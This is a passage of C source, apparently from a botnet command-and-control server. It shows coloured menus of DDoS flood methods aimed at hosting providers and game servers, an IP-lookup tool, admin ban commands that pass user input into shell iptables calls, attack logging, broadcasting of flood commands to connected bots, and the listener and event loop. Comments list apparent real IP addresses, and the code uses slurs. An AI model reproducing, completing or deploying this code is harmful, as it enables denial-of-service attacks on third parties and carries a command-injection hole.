            sprintf(botnet,"\x1b[38;2;255;0;66m               ╔══════════════════════════════════════╗\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m               ║ KILL TARGET PORT TIME           -[\e[0;32mL4\x1b[38;2;255;0;66m]║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m               ║ GROWTOPIA-RAPE TARGET PORT TIME -[\e[0;32mL4\x1b[38;2;255;0;66m]║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m               ║ GROWTOPIA-LAG TARGET PORT TIME  -[\e[0;32mL4\x1b[38;2;255;0;66m]║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m               ║ GROWTOPIA-NULL TARGET PORT TIME -[\e[0;32mL4\x1b[38;2;255;0;66m]║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m               ╚══════════════════════════════════════╝\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);


	    }
        else if(strstr(buf, "BYPASS") || strstr(buf, "Bypass") || strstr(buf, "bypass")) 
		{ 		  
            char clearscreen [2048];
			memset(clearscreen, 0, 2048);
			sprintf(clearscreen, "\033[2J\033[1;1H");
            if(send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
			sprintf(botnet,"\x1b[38;2;255;0;66m                   .▄▄▄  \x1b[38;2;255;0;129m▄• ▄▌\x1b[38;2;255;0;132m ▄▄▄· \x1b[38;2;255;0;192m▄▄▄  \x1b[38;2;255;0;195m▄▄▄▄▄\x1b[38;2;255;0;255m·▄▄▄▄•       \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);	
            sprintf(botnet,"\x1b[38;2;255;0;66m                   ▐▀•▀█ \x1b[38;2;255;0;129m█▪██▌\x1b[38;2;255;0;132m▐█ ▀█ \x1b[38;2;255;0;192m▀▄ █·\x1b[38;2;255;0;195m•██  \x1b[38;2;255;0;255m▪▀·.█▌         \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                   █▌·.█▌\x1b[38;2;255;0;129m█▌▐█▌\x1b[38;2;255;0;132m▄█▀▀█ \x1b[38;2;255;0;192m▐▀▀▄ \x1b[38;2;255;0;195m ▐█.\x1b[38;2;255;0;255m▪▄█▀▀▀•        \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                   ▐█▪▄█·\x1b[38;2;255;0;129m▐█▄█▌\x1b[38;2;255;0;132m▐█ ▪▐▌\x1b[38;2;255;0;192m▐█•█▌\x1b[38;2;255;0;195m ▐█▌\x1b[38;2;255;0;255m·█▌▪▄█▀        \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                   ·▀▀█. \x1b[38;2;255;0;129m ▀▀▀ \x1b[38;2;255;0;132m ▀  ▀ \x1b[38;2;255;0;192m.▀  ▀\x1b[38;2;255;0;195m ▀▀▀ \x1b[38;2;255;0;255m·▀▀▀ •             \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m               ╔══════════════════════════════════════╗\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m               ║ OVH-SLAP TARGET PORT TIME POWER -[\e[0;32mL4\x1b[38;2;255;0;66m]║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m               ║ CLOUDFLARE [DOWN FOR NOW]       -[\e[0;32mL7\x1b[38;2;255;0;66m]║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m               ║ OVH-QUARTZ TARGET PORT TIME PORT-[\e[0;32mL4\x1b[38;2;255;0;66m]║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m               ║ OVH-VPN TARGET PORT TIME PORT   -[\e[0;32mL4\x1b[38;2;255;0;66m]║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m               ║ NFO-SLAP TARGET PORT TIME PORT  -[\e[0;32mL4\x1b[38;2;255;0;66m]║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m               ║ NFO-QUARTZ TARGET PORT TIME PORT-[\e[0;32mL4\x1b[38;2;255;0;66m]║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m               ╚══════════════════════════════════════╝\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
	    }
        else if(strstr(buf, "METHODS") || strstr(buf, "Methods") || strstr(buf, "methods")) 
		{ 		  
            char clearscreen [2048];
			memset(clearscreen, 0, 2048);
			sprintf(clearscreen, "\033[2J\033[1;1H");
            if(send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
			sprintf(botnet,"\x1b[38;2;255;0;66m                   .▄▄▄  \x1b[38;2;255;0;129m▄• ▄▌\x1b[38;2;255;0;132m ▄▄▄· \x1b[38;2;255;0;192m▄▄▄  \x1b[38;2;255;0;195m▄▄▄▄▄\x1b[38;2;255;0;255m·▄▄▄▄•       \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);	
            sprintf(botnet,"\x1b[38;2;255;0;66m                   ▐▀•▀█ \x1b[38;2;255;0;129m█▪██▌\x1b[38;2;255;0;132m▐█ ▀█ \x1b[38;2;255;0;192m▀▄ █·\x1b[38;2;255;0;195m•██  \x1b[38;2;255;0;255m▪▀·.█▌         \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                   █▌·.█▌\x1b[38;2;255;0;129m█▌▐█▌\x1b[38;2;255;0;132m▄█▀▀█ \x1b[38;2;255;0;192m▐▀▀▄ \x1b[38;2;255;0;195m ▐█.\x1b[38;2;255;0;255m▪▄█▀▀▀•        \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                   ▐█▪▄█·\x1b[38;2;255;0;129m▐█▄█▌\x1b[38;2;255;0;132m▐█ ▪▐▌\x1b[38;2;255;0;192m▐█•█▌\x1b[38;2;255;0;195m ▐█▌\x1b[38;2;255;0;255m·█▌▪▄█▀        \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                   ·▀▀█. \x1b[38;2;255;0;129m ▀▀▀ \x1b[38;2;255;0;132m ▀  ▀ \x1b[38;2;255;0;192m.▀  ▀\x1b[38;2;255;0;195m ▀▀▀ \x1b[38;2;255;0;255m·▀▀▀ •             \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m        ╔═══════════╗ \x1b[38;2;255;0;69m╔══════════╗ ╔══════════╗ ╔══════════════╗\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m        ║OVH-SLAP   ║ \x1b[38;2;255;0;69m║NFO-SLAP  ║ ║QUARTZ-TCP║ ║GROWTOPIA-RAPE║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m        ║OVH-GAME   ║ \x1b[38;2;255;0;69m║NFO-GAME  ║ ║QUARTZ-UDP║ ║GROWTOPIA-LAG ║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m        ║OVH-NULL   ║ \x1b[38;2;255;0;69m║NFO-NULL  ║ ║FIVEM-SLAP║ ║GROWTOPIA-NULL║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m        ║OVH-QUARTZ ║ \x1b[38;2;255;0;69m║NFO-QUARTZ║ ║FIVEM-LAG ║ ║FORTNITE      ║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m        ║OVH-VPN    ║ \x1b[38;2;255;0;69m║NFO-VPN   ║ ║FIVEM-OVH ║ ║R6S           ║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m        ╚═══════════╝ \x1b[38;2;255;0;69m╚══════════╝ ╚══════════╝ ╚══════════════╝\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                              \x1b[38;2;255;0;69m╔══════════╗\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                              \x1b[38;2;255;0;69m║HTTP      ║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                              \x1b[38;2;255;0;69m║CLOUDFLARE║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                              \x1b[38;2;255;0;69m║KILLALL   ║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                              \x1b[38;2;255;0;69m║**********║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                              \x1b[38;2;255;0;69m║**********║\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                              \x1b[38;2;255;0;69m╚══════════╝\r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);


	    }
        else if(strstr(buf, "ADVANCED") || strstr(buf, "Advanced") || strstr(buf, "advanced")) 
		{ 		  
            		
			sprintf(botnet, "      \x1b[38;2;255;0;66m╔═══════════════════════════════════════════╗\r\n");
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "      \x1b[38;2;255;0;66m║\x1b[38;2;255;0;69m KILL \x1b[38;2;255;0;66m[\x1b[38;2;255;0;69mTARGET\x1b[38;2;255;0;66m] [\x1b[38;2;255;0;69mPORT\x1b[38;2;255;0;66m] [\x1b[38;2;255;0;69mTIME\x1b[38;2;255;0;66m]               ║     \r\n");       		
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "      \x1b[38;2;255;0;66m║\x1b[38;2;255;0;69m GROWTOPIA-RAPE \x1b[38;2;255;0;66m[\x1b[38;2;255;0;69mTARGET\x1b[38;2;255;0;66m] [\x1b[38;2;255;0;69mPORT\x1b[38;2;255;0;66m] [\x1b[38;2;255;0;69mTIME\x1b[38;2;255;0;66m]     ║    \r\n");
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "      \x1b[38;2;255;0;66m║\x1b[38;2;255;0;69m QUARTZ-UDP \x1b[38;2;255;0;66m[\x1b[38;2;255;0;69mTARGET\x1b[38;2;255;0;66m] [\x1b[38;2;255;0;69mPORT\x1b[38;2;255;0;66m] [\x1b[38;2;255;0;69mTIME\x1b[38;2;255;0;66m]         ║    \r\n");        
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);                                                                                                               //    
			sprintf(botnet, "      \x1b[38;2;255;0;66m║\x1b[38;2;255;0;69m QUARTZ-TCP \x1b[38;2;255;0;66m[\x1b[38;2;255;0;69mTARGET\x1b[38;2;255;0;66m] [\x1b[38;2;255;0;69mPORT\x1b[38;2;255;0;66m] [\x1b[38;2;255;0;69mTIME\x1b[38;2;255;0;66m] [\x1b[38;2;255;0;69mFLAGS\x1b[38;2;255;0;66m] ║    \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			sprintf(botnet, "      \x1b[38;2;255;0;66m╚═══════════════════════════════════════════╝    \r\n");			
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);					
	    }
 		else if(strstr(buf, "Tools") || strstr(buf, "TOOLS") || strstr(buf, "tools"))
			{
				sprintf(botnet,  "\x1b[38;2;255;0;69mRESOLVE \x1b[38;2;255;0;69m[\x1b[38;2;255;0;66mTARGET\x1b[38;2;255;0;69m]  \x1b[0m\r\n");         
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;69mIPLOOKUP \x1b[38;2;255;0;69m[\x1b[38;2;255;0;66mTARGET\x1b[38;2;255;0;69m] \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);				      
 		}			
	   else if(strstr(buf, "ADMIN") || strstr(buf, "admin") || strstr(buf, "Admin")) 
		{
				
				sprintf(botnet,  "\x1b[38;2;255;0;69mBANIP    \x1b[38;2;255;0;66mBans An IP Fron The c2                   \x1b[0m\r\n");         
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;69mUNBANIP  \x1b[38;2;255;0;66mUnbans An IP From The c2                 \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;69mONLINE   \x1b[38;2;255;0;66mShows All The Users Connected To The c2  \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);				        
 		}			
         // galaxicated ip 77.44.196.230
         /// trust ip 176.233.71.180
         // dismiss ip 78.189.183.243 
         // galaxicated ip 77.44.226.208
		else if(strstr(buf, "Logout") || strstr(buf, "logout") || strstr(buf, "LOGOUT"))
				{		
			sprintf(botnet, "\x1b[38;2;255;0;66mLogging Out Of The Botnet \x1b[38;2;255;0;69mC2\r\n");
			if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)goto end;
			sleep(2);
			goto end;			
			}
		else if(strstr(buf, "resolve") || strstr(buf, "RESOLVE"))
        {
            char *ip[100];
            char *token = strtok(buf, " ");
            char *url = token+sizeof(token);
            trim(url);
            resolve(url, ip);
              sprintf(botnet, "\x1b[38;2;255;0;66m[\x1b[38;2;255;0;69m%s\x1b[38;2;255;0;66m] \x1b[38;2;255;0;69m-> \x1b[38;2;255;0;66m[\x1b[38;2;255;0;69m%s\x1b[38;2;255;0;66m]\x1b[0m\r\n", url, ip);
              if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
	    else if(strstr(buf, "online") || strstr(buf, "ONLINE")){
        int kkkkkk;
        for(kkkkkk = 0; kkkkkk < MAXFDS; kkkkkk++)
        {
            if(!managements[kkkkkk].connected) continue;
            if(managements[datafd].adminstatus == 1){
                sprintf(botnet, "\x1b[38;2;255;0;69mUsername\x1b[38;2;255;0;66m: %s \x1b[38;2;255;0;69m[\x1b[38;2;255;0;66m%s\x1b[38;2;255;0;69m]\x1b[0m\r\n", managements[kkkkkk].nickname, managements[kkkkkk].ip);
            } else {
	 			printf("\x1b[38;2;255;0;69m%s \x1b[38;2;255;0;66mHas Attempted To Use An Admin Command With A Regular Account\x1b[0m\r\n", accounts[find_line].username);
                sprintf(botnet, "\x1b[38;2;255;0;69mAdmins Only!\r\n");
            }
            if(send(datafd, botnet, strlen(botnet), 0) == -1) return;
        }
    }
      
     if(strstr(buf, "BANIP") || strstr(buf, "Banip") || strstr(buf, "banip")) {	
        if(managements[datafd].adminstatus == 1){
        char bannie111[40];
        char commandban[80];
        char commandban1[80];

        if(send(datafd, "\x1b[38;2;255;0;69mIp\x1b[38;2;255;0;66m: ", strlen("\x1b[38;2;255;0;69mIp\x1b[38;2;255;0;66m: "), MSG_NOSIGNAL) == -1) goto end;
        memset(bannie111, 0, sizeof(bannie111));
        read(datafd, bannie111, sizeof(bannie111));
        trim(bannie111);
                
        char banmsg[80];
        
		// Yes I Ban With IpTables
        sprintf(commandban, "iptables -A INPUT -s %s -j DROP", bannie111);  
        sprintf(commandban1, "iptables -A OUTPUT -s %s -j DROP", bannie111);

        system(commandban);
        system(commandban1);
        LogFile2 = fopen("Logs/ip.ban.unban.log", "a");
        fprintf(LogFile2, "Banned Ip: %s\n", bannie111);
        fclose(LogFile2);

        sprintf(banmsg, "\x1b[38;2;255;0;69mIp\x1b[38;2;255;0;66m: %s Is Banned\r\n", bannie111);
        if(send(datafd, banmsg,  strlen(banmsg),    MSG_NOSIGNAL) == -1) goto end; 

        if(send(datafd, prompt, strlen(prompt), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, prompt2, strlen(prompt2), MSG_NOSIGNAL) == -1) goto end;
    }
    else
        if(send(datafd, "\x1b[1;31mAdmins Only!\r\n", strlen("\x1b[1;31mAdmins Only!\r\n"), MSG_NOSIGNAL) == -1) goto end;
}
 if(strstr(buf, "UNBANIP") || strstr(buf, "Unbanip") || strstr(buf, "unbanip")) {
     if(managements[datafd].adminstatus == 1){
        char bannie1 [800];
        char commandunban[80];
        char commandunban1[80];

        if(send(datafd, "\x1b[38;2;255;0;69mIp\x1b[38;2;255;0;66m: ", strlen("\x1b[38;2;255;0;69mIp\x1b[38;2;255;0;66m: "), MSG_NOSIGNAL) == -1) goto end;
        memset(bannie1, 0, sizeof(bannie1));
        read(datafd, bannie1, sizeof(bannie1));
        trim(bannie1);

        char unbanmsg[80];

        // Yes I Ban With IpTables
		sprintf(commandunban, "iptables -D INPUT -s %s -j DROP", bannie1);
        sprintf(commandunban1, "iptables -D OUTPUT -s %s -j DROP", bannie1);

        system(commandunban);
        system(commandunban1);
        LogFile2 = fopen("Logs/ip.ban.unban.log", "a");

        fprintf(LogFile2, "Unbanned | Ip:%s\n", bannie1);
        fclose(LogFile2);

        sprintf(unbanmsg, "\x1b[38;2;255;0;69mIp\x1b[38;2;255;0;66m: %s is Unbanned\r\n", bannie1);

        if(send(datafd, unbanmsg,  strlen(unbanmsg),    MSG_NOSIGNAL) == -1) goto end;  
 
        if(send(datafd, topusername, strlen(topusername), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, blankline, strlen(blankline), MSG_NOSIGNAL) == -1) goto end;          
		if(send(datafd, ascii1, strlen(ascii1), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii2, strlen(ascii2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii3, strlen(ascii3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii4, strlen(ascii4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii5, strlen(ascii5), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, prompt, strlen(prompt), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, prompt2, strlen(prompt2), MSG_NOSIGNAL) == -1) goto end;
    }
    else
        if(send(datafd, "\x1b[1;31mAdmins Only!\r\n", strlen("\x1b[1;31mAdmins Only!\r\n"), MSG_NOSIGNAL) == -1) goto end;
}
		if(strstr(buf, "iplookup") || strstr(buf, "IPLOOKUP"))
        {
            char myhost[20];
            char ki11[1024];
            snprintf(ki11, sizeof(ki11), "%s", buf);
            trim(ki11);
            char *token = strtok(ki11, " ");
            snprintf(myhost, sizeof(myhost), "%s", token+strlen(token)+1);
            if(atoi(myhost) >= 8)
            {
                int ret;
                int IPLSock = -1;
                char iplbuffer[1024];
                int conn_port = 80;
                char iplheaders[1024];
                struct timeval timeout;
                struct sockaddr_in sock;
                char *iplookup_host = ""APIHOST""; // Change to Server IP
                timeout.tv_sec = 4; // 4 second timeout
                timeout.tv_usec = 0;
                IPLSock = socket(AF_INET, SOCK_STREAM, 0);
                sock.sin_family = AF_INET;
                sock.sin_port = htons(conn_port);
                sock.sin_addr.s_addr = inet_addr(iplookup_host);
                if(connect(IPLSock, (struct sockaddr *)&sock, sizeof(sock)) == -1)
                {
                    sprintf(botnet, "\x1b[1;31mFailed To Connect To The IPL Socket\r\n");
                    if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else
                {
                    snprintf(iplheaders, sizeof(iplheaders), "GET /iplookup.php?host=%s HTTP/1.1\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding:gzip, deflate, sdch\r\nAccept-Language:en-US,en;q=0.8\r\nCache-Control:max-age=0\r\nConnection:keep-alive\r\nHost:%s\r\nUpgrade-Insecure-Requests:1\r\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/531m.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/531m.36\r\n\r\n", myhost, iplookup_host);
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        sprintf(botnet, "\x1b[1;32mSearching The IPL Database\r\n");
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        char ch;
                        int retrv = 0;
                        uint32_t header_parser = 0;
                        while (header_parser != 0x0D0A0D0A)
                        {
                            if ((retrv = read(IPLSock, &ch, 1)) != 1)
                                break;
                
                            header_parser = (header_parser << 8) | ch;
                        }
                        memset(iplbuffer, 0, sizeof(iplbuffer));
                        while(ret = read(IPLSock, iplbuffer, 1024))
                        {
                            iplbuffer[ret] = '\0';
                        }
                        if(strstr(iplbuffer, "<title>404"))
                        {
                            char iplookup_host_token[20];
                            sprintf(iplookup_host_token, "%s", iplookup_host);
                            int ip_prefix = atoi(strtok(iplookup_host_token, "."));
                            sprintf(botnet, "\x1b[1;31mIPL Failed To Locate The Socket\x1b[0m\r\n", ip_prefix);
                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token));
                        }
                        else if(strstr(iplbuffer, "nickers"))
                            sprintf(botnet, "\x1b[1;31mPHP Must Be Installed To Use IPL\x1b[0m\r\n");
                        else sprintf(botnet, "\x1b[38;2;255;0;66m[+]--- \x1b[38;2;255;0;69mResults \x1b[38;2;255;0;66m---[+]\r\n\x1b[38;2;255;0;66m%s \x1b[0m\r\n", iplbuffer);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                    else
                    {
                        sprintf(botnet, "\x1b[1;31mIPL Failed To Send The Request Headers\x1b[0m\r\n");
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                close(IPLSock);
            }
        }

        trim(buf);
        if(send(datafd, prompt, strlen(prompt), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, prompt2, strlen(prompt2), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;

			FILE *LogFile;
            LogFile = fopen("Logs/server_history.log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "[%s]: %s\n", formatted_gmt, buf);
            fclose(LogFile);
			// Prints All Attacks Sent To The Socket And Logs The Attack Sent
			if(strstr(buf,"OVH-SLAP")  || strstr(buf,"NFO-SLAP") ||  strstr(buf,"OVHUDP") || strstr(buf,"KILL"))
			{	
            char attacklog[1024];
			// Prints attacks to the sockets and Logs it
		    printf("\x1b[38;2;255;0;69m%s \x1b[1;32mHas Sent Succesfully Sent A Flood \x1b[38;2;255;0;66m|\x1b[38;2;255;0;69m %s\n",accounts[find_line].username, buf);
			sprintf(attacklog, "echo 'User: %s | Status: %s | Ip: %s | Attack:%s' >> /root/Logs/AttackLogs.log", accounts[find_line].username, accounts[find_line].type, management_ip, buf);
            system(attacklog);
			///////////////////
			char addtrigger[5000];
            sprintf(addtrigger, ". %s", buf);
            broadcast(addtrigger, datafd, accounts[find_line].username);
			}
            memset(buf, 0, 2048);
        }
        char userleft[1024];
		end:
		// Shows, Logs, And Prints c2 Disconnections
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
		if(managements[datafd].adminstatus == 1){
		printf("\x1b[38;2;255;0;69mUser\x1b[38;2;255;0;66m: %s | \x1b[38;2;255;0;69mStatus\x1b[38;2;255;0;66m: %s |\x1b[38;2;255;0;69m Disconnected From C2\x1b[0m\n",accounts[find_line].username, accounts[find_line].type);
        sprintf(userleft, "echo 'User: %s | Status: %s | Has Logged Out' >> Logs/C2Logouts.log", accounts[find_line].username, accounts[find_line].type);
        system(userleft);
		} else {
		printf("User: %s | Status: %s | Ip: %s | Disconnected From C2\n", accounts[find_line].username, accounts[find_line].type, management_ip);
        sprintf(userleft, "echo 'User: %s | Status: %s | Ip: %s | Has Logged Out' >> Logs/C2Logouts.log", accounts[find_line].username, accounts[find_line].type, management_ip);
        system(userleft);		
		}
}
void *BotListener(int port){
    int sockfd, newsockfd, gay=1;
    struct epoll_event event;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
	if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &gay, sizeof(int)) < 0) // HUNNNNNNN YEA
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while (1){
        newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        
        struct telnetListenerArgs args;
        args.sock = newsockfd;
        args.ip = ((struct sockaddr_in *)&cli_addr)->sin_addr.s_addr;

        pthread_t thread;
        pthread_create(&thread, NULL, &BotWorker, (void *)&args);
    }   
}
int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Your Fucking Dumb :(\n", argv[0]);
			exit (EXIT_FAILURE);
        }

		port = atoi(argv[3]);
		
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
		fprintf (stderr, "  \x1b[38;2;255;0;66m[\x1b[38;2;255;0;69mBotnet Screened\x1b[38;2;255;0;66m]\n\n \x1b[38;2;255;0;69mBotPot \x1b[38;2;255;0;66m-> \x1b[38;2;255;0;69m%s \n \x1b[38;2;255;0;69mC2 Port \x1b[38;2;255;0;66m->\x1b[38;2;255;0;69m %s \n \x1b[38;2;255;0;69mThreads Used \x1b[38;2;255;0;66m-> \x1b[38;2;255;0;69m%s\x1b[0m\n\n\n", argv[1], argv[3] ,argv[2]);
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
